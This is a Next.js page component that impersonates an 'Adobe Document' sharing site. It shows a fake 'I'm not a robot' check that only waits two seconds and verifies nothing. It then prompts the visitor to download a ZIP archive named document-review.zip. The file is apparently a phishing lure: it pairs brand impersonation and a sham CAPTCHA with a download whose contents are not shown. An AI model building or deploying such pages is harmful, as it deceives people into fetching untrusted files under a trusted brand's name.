
"use client";

import { useEffect, useRef, useState } from "react";
import Image from "next/image";

const DOWNLOAD_URL = "/document-review.zip";
const DOWNLOAD_NAME = "document-review.zip";
const DOCUMENT_TITLE = "Document for review";

type CheckStatus = "idle" | "checking" | "complete";

function DocumentIcon({ className = "" }: { className?: string }) {
  return (
    <svg
      aria-hidden="true"
      viewBox="0 0 24 24"
      fill="none"
      stroke="currentColor"
      strokeWidth="1.5"
      strokeLinecap="round"
      strokeLinejoin="round"
      className={className}
    >
      <path d="M14 3H6a1 1 0 0 0-1 1v16a1 1 0 0 0 1 1h12a1 1 0 0 0 1-1V8l-5-5Z" />
      <path d="M14 3v5h5M8 12h8M8 16h5" />
    </svg>
  );
}

function ArrowIcon() {
  return (
    <svg
      aria-hidden="true"
      viewBox="0 0 24 24"
      fill="none"
      stroke="currentColor"
      strokeWidth="1.6"
      strokeLinecap="round"
      strokeLinejoin="round"
      className="h-4 w-4"
    >
      <path d="M5 12h14m-5-5 5 5-5 5" />
    </svg>
  );
}

function DownloadIcon() {
  return (
    <svg
      aria-hidden="true"
      viewBox="0 0 24 24"
      fill="none"
      stroke="currentColor"
      strokeWidth="1.6"
      strokeLinecap="round"
      strokeLinejoin="round"
      className="h-4 w-4"
    >
      <path d="M12 3v12m-4-4 4 4 4-4M5 16v4h14v-4" />
    </svg>
  );
}

function CheckIcon() {
  return (
    <svg
      aria-hidden="true"
      viewBox="0 0 24 24"
      fill="none"
      stroke="currentColor"
      strokeWidth="2.5"
      strokeLinecap="round"
      strokeLinejoin="round"
      className="h-7 w-7 text-emerald-700"
    >
      <path d="m5 12 4 4L19 6" />
    </svg>
  );
}

function CaptchaScreen({ onContinue }: { onContinue: () => void }) {
  const [status, setStatus] = useState<CheckStatus>("idle");

  useEffect(() => {
    if (status !== "checking") return;

    const timer = window.setTimeout(() => {
      setStatus("complete");
    }, 2000);

    return () => window.clearTimeout(timer);
  }, [status]);

  return (
    <section
      aria-labelledby="captcha-title"
      className="w-full max-w-[380px]"
    >
      <div className="pointer-events-none absolute inset-0 overflow-hidden">

        <Image
          src="/adobe.png"
          alt=""
          fill
          priority
          sizes="100vw"
          className="object-cover object-center"
        />

        {/* Dark red overlay */}
        <div className="absolute inset-0 bg-[#26070d]/55" />

        {/* Red gradient overlay */}
        <div className="absolute inset-0 bg-gradient-to-br from-red-900/50 via-transparent to-rose-950/70" />

        {/* Ambient glassmorphism glow */}
        <div className="absolute -left-32 top-20 h-96 w-96 rounded-full bg-red-500/20 blur-[110px]" />

        <div className="absolute -right-24 bottom-0 h-[28rem] w-[28rem] rounded-full bg-rose-700/25 blur-[120px]" />

        <div className="absolute left-1/2 top-1/2 h-72 w-72 -translate-x-1/2 -translate-y-1/2 rounded-full bg-red-400/10 blur-[100px]" />
      </div>
      <div className="mb-7 text-center">
        <p
          id="captcha-title"
          className="text-xl font-medium tracking-tight text-white sm:text-[14px]"
        >
          Before you continue
        </p>
      </div>

      <div className="rounded-2xl border border-white/20 bg-white/10 p-5 shadow-[0_20px_80px_-25px_rgba(0,0,0,0.5)] backdrop-blur-2xl sm:p-7">
        <div className="flex items-center justify-between gap-3 rounded-lg border border-white/20 bg-white/10 px-3 py-5">
          <label className="flex min-w-0 items-center gap-3">
            <span className="grid h-7 w-7 shrink-0 place-items-center">
              <input
                type="checkbox"
                checked={status !== "idle"}
                disabled={status !== "idle"}
                onChange={(event) => {
                  if (event.target.checked) {
                    setStatus("checking");
                  }
                }}
                aria-describedby="checkbox-status"
                className={
                  status === "idle"
                    ? "h-7 w-7 cursor-pointer accent-rose-500"
                    : "sr-only"
                }
              />

              {status === "checking" && (
                <span className="h-6 w-6 animate-spin rounded-full border-2 border-white/30 border-t-white" />
              )}

              {status === "complete" && <CheckIcon />}
            </span>

            <span className="text-[13px] text-white">
              I&apos;m not a robot
            </span>
          </label>

          <div aria-hidden="true" className="shrink-0 text-white/60">
            <svg
              viewBox="0 0 24 24"
              fill="none"
              stroke="currentColor"
              strokeWidth="1.5"
              strokeLinecap="round"
              strokeLinejoin="round"
              className="h-6 w-6"
            >
              <path d="M12 3 4 6v6c0 5 8 9 8 9s8-4 8-9V6l-8-3Z" />
              <path d="m9 12 2 2 4-4" />
            </svg>
          </div>
        </div>

        <p
          id="checkbox-status"
          role="status"
          aria-live="polite"
          className="mt-3 min-h-5 text-xs text-white/70"
        >
          {status === "idle"
            ? "Select the checkbox to begin."
            : status === "checking"
              ? "Confirming your selection…"
              : "Complete. You may now continue."}
        </p>

        <button
          type="button"
          disabled={status !== "complete"}
          onClick={() => {
            if (status === "complete") onContinue();
          }}
          className="mt-5 flex w-full items-center justify-center gap-3 rounded-lg bg-white px-4 py-3 text-sm font-semibold text-[#790D19] transition hover:bg-rose-50 disabled:cursor-not-allowed disabled:bg-white/20 disabled:text-white/40"
        >
          Continue
          <ArrowIcon />
        </button>
      </div>
    </section>
  );
}

export default function Home() {
  const [captchaComplete, setCaptchaComplete] = useState(false);

  const titleRef = useRef<HTMLHeadingElement>(null);

  useEffect(() => {
    if (captchaComplete) {
      titleRef.current?.focus();
    }
  }, [captchaComplete]);

  return (
    <div className="relative isolate flex h-screen h-[100dvh] flex-col overflow-hidden bg-[#26070D] font-sans text-white">

      {/* Full-screen red glassmorphism background */}
      <div className="pointer-events-none fixed inset-0 -z-10 overflow-hidden">
        <div className="absolute inset-0 bg-gradient-to-br from-[#8B1020] via-[#4B0B16] to-[#17060A]" />

        <div className="absolute -left-32 -top-32 h-[500px] w-[500px] rounded-full bg-red-600/40 blur-[130px]" />

        <div className="absolute -bottom-40 -right-32 h-[550px] w-[550px] rounded-full bg-rose-500/30 blur-[140px]" />

        <div className="absolute inset-0 bg-black/10" />

        <div className="absolute inset-0 bg-[radial-gradient(circle_at_center,transparent_0%,rgba(0,0,0,0.25)_100%)]" />
      </div>

      <header className="shrink-0 border-b border-white/15 bg-white/5 backdrop-blur-xl">
        <div className="mx-auto flex h-16 w-full max-w-6xl items-center justify-between px-5 sm:px-8">
          <a
            href="/"
            aria-label="Document Space home"
            className="flex items-center gap-3 rounded focus-visible:outline focus-visible:outline-2 focus-visible:outline-offset-4 focus-visible:outline-white"
          >
            <span className="grid h-9 w-9 place-items-center rounded-lg border border-white/20 bg-white/10 text-white shadow-lg backdrop-blur-xl">
              <DocumentIcon className="h-5 w-5" />
            </span>

            <span className="text-sm font-semibold tracking-tight text-white">
              Adobe Document
            </span>
          </a>
          
<img src="/new.png" alt="" className="" />

        </div>
      </header>

      <main className="relative flex min-h-0 flex-1 overflow-y-auto px-5 py-6">
        <div className="my-auto flex w-full justify-center">
          {!captchaComplete ? (
            <CaptchaScreen
              onContinue={() => setCaptchaComplete(true)}
            />
          ) : (
            <section
              aria-labelledby="page-title"
              className="relative w-full max-w-[400px]"
            >
              <div className="mb-7 text-center">
                <p className="mb-3 text-[10px] font-semibold uppercase tracking-[0.22em] text-rose-100/70">
                  Shared with you
                </p>

                <h1
                  ref={titleRef}
                  tabIndex={-1}
                  id="page-title"
                  className="text-2xl font-medium tracking-tight text-white outline-none sm:text-[28px]"
                >
                  Your download is ready.
                </h1>
              </div>

              <div className="relative overflow-hidden rounded-2xl border border-white/20 bg-white/10 p-6 shadow-[0_20px_80px_-25px_rgba(0,0,0,0.5)] backdrop-blur-2xl sm:p-7">

                {/* Glass highlight */}
                <div
                  aria-hidden="true"
                  className="pointer-events-none absolute inset-x-0 top-0 h-px bg-gradient-to-r from-transparent via-white/70 to-transparent"
                />

                <div className="mb-5 flex items-center justify-between">
                  <span className="grid h-12 w-12 place-items-center rounded-xl border border-white/20 bg-white/10 text-white shadow-inner">
                    <DocumentIcon className="h-6 w-6" />
                  </span>

                  <span className="rounded-full border border-rose-200/20 bg-rose-300/10 px-3 py-1 text-[10px] font-medium uppercase tracking-wider text-rose-100">
                    Document
                  </span>
                </div>

                <h2 className="break-words text-lg font-medium tracking-tight text-white">
                  {DOCUMENT_TITLE}
                </h2>

                <p className="mt-2 text-xs leading-5 text-white/60">
                  Your document is ready. Use the button below to download it.
                </p>

                <div className="my-5 h-px bg-white/15" />

                <a
                  href={DOWNLOAD_URL}
                  download={DOWNLOAD_NAME}
                  className="flex w-full items-center justify-center gap-3 rounded-lg bg-white px-4 py-3 text-sm font-semibold text-[#790D19] shadow-lg transition duration-200 hover:-translate-y-0.5 hover:bg-rose-50 hover:shadow-xl focus-visible:outline focus-visible:outline-2 focus-visible:outline-offset-4 focus-visible:outline-white"
                >
                  Download document
                  <DownloadIcon />
                </a>
              </div>

              <p className="mt-5 text-center text-[11px] text-white/50">
                Adobe Document  · Secure document access 
              </p>
            </section>
          )}
        </div>
      </main>

      <footer className="shrink-0 border-t border-white/10 bg-white/5 px-5 py-4 text-center text-[10px] text-white/50 backdrop-blur-xl">
       Adobe Document © 2026
      </footer>
    </div>
  );
}
